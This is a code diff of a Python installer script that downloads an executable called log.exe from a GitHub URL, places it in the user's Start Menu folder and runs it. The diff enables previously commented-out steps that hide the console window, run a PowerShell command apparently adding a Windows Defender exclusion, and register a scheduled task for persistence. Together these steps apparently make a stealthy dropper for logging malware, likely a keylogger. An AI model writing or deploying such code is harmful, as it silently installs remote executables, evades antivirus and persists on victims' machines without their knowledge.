@@ -3,7 +3,7 @@ from win32gui import ShowWindow, GetForegroundWindow
 from requests import get
 from subprocess import run, Popen
 
-url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'
+url = 'https://github.com/Pixel48/logger/raw/exe/log.exe'
 
 folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
 filepath = os.path.join(folderpath, 'log.exe')
@@ -31,10 +31,10 @@ def defender_ignore(folderpath):
     run(['powershell', '-command', command ], check=True)
 
 def main():
-    # hide_window()
-    # defender_ignore(folderpath)
+    hide_window()
+    defender_ignore(folderpath)
     download(url, filepath)
-    # setup_task()
+    setup_task()
     Popen([filepath])
 
 if __name__ == '__main__':
